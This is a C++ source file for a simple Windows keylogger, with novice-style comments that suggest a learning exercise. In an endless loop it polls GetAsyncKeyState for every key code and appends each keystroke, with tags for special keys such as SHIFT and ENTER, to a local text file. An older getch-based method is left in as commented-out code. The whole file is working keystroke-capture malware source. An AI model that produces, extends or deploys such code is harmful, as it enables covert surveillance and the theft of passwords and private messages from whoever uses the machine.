#include <iostream> // input-output stream
#include <windows.h> // importing windows function
#include <conio.h> // console input-output
#include <fstream> // file input-output stream
//if this is connected it'll show

using namespace std; // no need to use std::cout, just cout is good

int keys(char key, fstream&); // declares the function we'll be using for keystrokes

int main(){

  char key_press; // the key we will be recording
  int ascii_value; // ascii value of said key as well

  fstream afile; // declares the file we will be using

  afile.open("key_file.txt", ios::in | ios::out); // not entirely sure what this means
  afile.close();

  while(true){

    /* Block 1 Starts */
    //key_press = getch(); // here it uses getch to record the keystrokes
    //ascii_value = key_press; 
    //cout << "Here --> " << key_press << endl; // shows you in the console what it's doing
    // cout << "Async --> " << ascii_value << endl; // also can you ascii number
    //if(7 < ascii_value && ascii_value < 256){ // ascii 7 and below and 256 and above aren't actual keystrokes
    //  keys(key_press, afile); // compiled language, defined later as how we record the stuff
    //}
    /* Block 1 Ends */


    /* Block 2 Starts */

     for(int i=8; i<256; i++){ // figure out how this works later (i presume same principle, not sure how though)
       if(GetAsyncKeyState(i) == -32767){ // uses the windows integration of recording, which determines if key is up or not
         keys(i, afile); // again, defined later b/c compiled language
       }
     }

    /* Block 2 Ends */
  }
  return 0;
}

int keys(char key, fstream& file){

  file.open("key_file.txt", ios::app | ios::in | ios::out); // declares file name as well as ios(tream) variables
  if(file){
    if(GetAsyncKeyState(VK_SHIFT)){ // for these ones, it uses windows to determine if a special character has been pressed, fairly useful actually
      file << "[SHIFT]";
    }
    else if(GetAsyncKeyState(VK_ESCAPE)){
      file << "[ESCAPE]";
    }
    else if(GetAsyncKeyState(VK_RETURN)){
      file << "[ENTER]";
    }
    else if(GetAsyncKeyState(VK_CONTROL)){
      file << "[CONTROL]";
    }
    else if(GetAsyncKeyState(VK_MENU)){
      file << "[ALT]";
    }
    else if(GetAsyncKeyState(VK_DELETE)){
      file << "[DELETE]";
    }
    else if(GetAsyncKeyState(VK_TAB)){
      file << "[TAB]";
    }
    else if(GetAsyncKeyState(VK_BACK)){
      file << "[BACKSPACE]";
    }
    else{
      file << key; // and if none of those conditions are met, we simply record the char to the file. overall pretty nifty
    }
  }

  file.close();

  return 0;
}